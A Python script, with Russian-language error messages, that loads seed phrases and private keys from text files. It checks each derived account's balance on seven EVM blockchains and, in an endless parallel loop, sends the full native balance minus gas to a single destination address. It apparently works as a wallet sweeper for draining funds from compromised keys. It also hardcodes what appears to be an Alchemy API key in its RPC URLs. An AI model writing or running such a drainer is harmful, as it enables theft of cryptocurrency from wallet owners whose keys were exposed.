from web3 import Web3
from eth_account import Account
import concurrent.futures

def process_task(args):
    func, to_address, token, seed_or_key = args
    return func(seed_or_key, to_address, token)

def read_phrases(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return f.readlines()
    except FileNotFoundError:
        print(f"Ошибка чтения {filename}")
        return []


def read_private_keys(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return f.readlines()
    except FileNotFoundError:
        print(f"Ошибка чтения {filename}")
        return []


def check_balance(seed_or_key, token):
    web3 = Web3(Web3.HTTPProvider(token[0]))
    try:
        if seed_or_key.startswith('0x'):
            private_key = str(seed_or_key.strip())
            account = Account.from_key(private_key)
        else:
            seed = str(seed_or_key.strip())
            Account.enable_unaudited_hdwallet_features()
            account = Account.from_mnemonic(seed)
            private_key = account.key.hex()
    except Exception:
        return 0, None, None

    account_address = account.address
    balance = web3.eth.get_balance(account_address)
    balance_ether = web3.from_wei(balance, 'ether')
    print(f"Balance for {token[2]}: {balance_ether}")
    return balance_ether, account, private_key


def withdraw_token(seed_or_key, to_address, token):
    try:
        balance_ether, account, private_key = check_balance(seed_or_key, token)
        if balance_ether > 0:
            web3 = Web3(Web3.HTTPProvider(token[0]))
            account_address = account.address
            gas_price = web3.eth.gas_price

            gas_estimate = web3.eth.estimate_gas({
                "from": account_address,
                "to": to_address,
                "value": 0
            })
            total_fee = gas_estimate * gas_price

            if balance_ether >= web3.from_wei(total_fee, 'ether'):
                send_value = balance_ether - web3.from_wei(total_fee, 'ether')
                nonce = web3.eth.get_transaction_count(account_address)
                tx = {'nonce': nonce, 'to': to_address, 'gas': gas_estimate,
                      'value': web3.to_wei(send_value, 'ether'), 'gasPrice': gas_price, 'chainId': token[1]}
                signed_tx = account.sign_transaction(tx)
                tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
                print(f'transfer hash: {token[3]}{tx_hash.hex()}, amount: {send_value} {token[2]}')
            else:
                print(f'Insufficient funds for gas: {balance_ether}, gas cost: {web3.from_wei(total_fee, "ether")}')
    except Exception as e:
        print(f'Error in withdraw_token: {str(e)}')



def auto_withdraw(to_address):
    tokens = [
        ['https://bsc-dataseed.binance.org', 56, 'BNB', 'https://bscscan.com/tx/'],
        ['https://polygon-rpc.com', 137, 'MATIC', 'https://polygonscan.com/tx/'],
        ['https://api.avax.network/ext/bc/C/rpc', 43114, 'AVAX', 'https://cchain.explorer.avax.network/tx/'],
        ['https://rpc.ftm.tools/', 250, 'Fantom', 'https://ftmscan.com/tx/'],
        ['https://eth-mainnet.g.alchemy.com/v2/JcFamAmKqCWqjBTJuSuqxEpJJpG3t_Vp', 1, 'ETH', 'https://etherscan.io/tx/'],
        ['https://arb1.arbitrum.io/rpc', 42161, 'Arbitrum', 'https://arbiscan.io/tx/'],
        ['https://opt-mainnet.g.alchemy.com/v2/JcFamAmKqCWqjBTJuSuqxEpJJpG3t_Vp', 10, 'Optimism', 'https://optimistic.etherscan.io/tx/']
    ]
    phrases = read_phrases('phrases.txt')
    private_keys = read_private_keys('private_keys.txt')

    tasks = []

    for phrase in phrases:
        for token in tokens:
            tasks.append((withdraw_token, to_address, token, phrase))
    for private_key in private_keys:
        for token in tokens:
            tasks.append((withdraw_token, to_address, token, private_key))

    with concurrent.futures.ProcessPoolExecutor() as executor:
        results = list(executor.map(process_task, tasks))

    for i, result in enumerate(results):
        if isinstance(result, Exception):
            print(f"Ошибка в задаче {i}: {result}")

if __name__ == '__main__':
    to_address = "YOUR_ADDRESS"
    while True:
        try:
            auto_withdraw(to_address)
        except Exception as err:
            print(f"Ошибка при выполнении вывода: {err}")
